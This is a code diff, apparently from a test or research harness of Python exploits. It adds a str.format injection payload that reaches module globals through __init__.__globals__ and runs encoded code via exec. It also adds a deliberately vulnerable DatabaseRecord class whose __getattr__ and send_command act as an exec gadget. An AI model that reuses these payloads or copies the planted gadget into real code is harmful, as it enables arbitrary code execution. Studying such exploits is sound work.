@@ -67,3 +67,56 @@ class YamlLoadsExploit(SimplePythonExploit):
 
     def run_payload(payload: str) -> None:
         yaml.load(payload, Loader=yaml.UnsafeLoader)
+
+
+class StringFormatExploit(SimplePythonExploit):
+    vulnerable_function = "str.format"
+
+    def generate_payload(source_code: str) -> str:
+        encoded_source_code = "".join(["\\" + hex(ord(c))[1:] for c in source_code])
+        return f"{{event.__init__.__globals__[record].exec(b'{encoded_source_code}')_send_command}}"
+
+    def run_payload(payload: str) -> None:
+        """Note that this exploit is enabled by the following code at the global scope:
+        class DatabaseRecord:
+            def cached(self, attribute):
+                pass
+
+            def from_database(self, attribute):
+                pass
+
+            def send_command(self, command):
+                exec(command)
+
+            def __getattr__(self, key):
+                print(key)
+                attr_name, state = key.split("_", 1)
+                return getattr(self, state)(attr_name)
+
+        record = DatabaseRecord()
+        """
+
+        class SomeObject(object):
+            def __init__(self, value):
+                self.value = value
+
+        payload.format(event=SomeObject(1))
+
+
+class DatabaseRecord:
+    def cached(self, attribute):
+        pass
+
+    def from_database(self, attribute):
+        pass
+
+    def send_command(self, command):
+        exec(command)
+
+    def __getattr__(self, key):
+        print(key)
+        attr_name, state = key.split("_", 1)
+        return getattr(self, state)(attr_name)
+
+
+record = DatabaseRecord()
